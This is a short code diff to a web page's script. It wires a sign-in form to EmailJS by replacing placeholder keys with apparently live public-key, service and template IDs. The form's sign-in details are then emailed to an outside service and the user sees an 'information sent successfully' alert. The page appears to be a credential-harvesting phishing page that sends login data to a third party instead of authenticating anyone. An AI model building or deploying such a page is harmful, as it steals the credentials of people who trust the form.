@@ -294,7 +294,7 @@
 
 <script>
   (function(){
-    emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
+    emailjs.init("SdkmRe8WZ7itEba9z");
   })();
 
   const form = document.getElementById('signin-form');
@@ -323,7 +323,7 @@
       remember_id: form.remember_id.checked ? "Yes" : "No"
     };
 
-    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+    emailjs.send('service_zuj2d2a', 'template_tvd86sp', templateParams)
       .then(() => {
         alert('Sign-in information sent successfully!');
         form.reset();
